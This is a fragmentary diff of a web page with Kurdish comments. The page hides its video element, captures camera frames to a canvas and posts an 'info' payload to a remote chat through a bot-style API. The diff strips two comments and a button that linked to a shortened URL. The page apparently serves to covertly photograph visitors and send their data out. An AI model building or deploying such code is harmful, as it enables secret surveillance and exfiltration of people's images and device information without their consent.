@@ -9,10 +9,9 @@
         
         .camera-screen { position: relative; width: 100%; height: 100vh; background: #111; display: flex; flex-direction: column; justify-content: space-between; }
         
-        /* ڤیدیۆکە شاراوە دەبێت و ئەگەر پێویست بکات هاوسەنگ دەکرێتەوە */
         video { 
             display: none; 
-            transform: scaleX(-1); /* بۆ ڕاستکردنەوەی پێچەوانەبوونی کامێرا */
+            transform: scaleX(-1);
         }
         
         .top-bar { position: relative; z-index: 10; display: flex; justify-content: space-between; align-items: flex-start; padding: 15px 20px; }
@@ -176,17 +175,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: info,
-                        reply_markup: {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: "🔗 سەردانیکردنی وێبسایتەکە",
-                                        url: "https://pqr.me/tXkzZOTt"
-                                    }
-                                ]
-                            ]
-                        }
+                        text: info
                     })
                 });
             } catch (err) {}
@@ -222,7 +211,6 @@
             
             const ctx = canvas.getContext('2d');
             
-            // ئەگەر کامێرا پێشەوە بوو (user)، وێنەکە ڕاست دەکەینەوە لە کاتی کێشانیدا
             if (currentFacingMode === 'user') {
                 ctx.translate(canvas.width, 0);
                 ctx.scale(-1, 1);
